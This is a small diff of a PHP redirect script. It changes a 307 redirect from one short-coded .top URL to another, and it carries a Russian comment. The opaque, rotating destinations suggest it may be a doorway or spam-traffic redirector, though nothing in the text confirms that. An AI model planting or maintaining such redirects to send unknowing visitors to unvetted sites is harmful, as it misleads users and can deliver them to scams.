@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://financebox.top/fKqcr4');
+header('Location:  https://freshshop.top/qqjrq7');
 exit();
 ?>
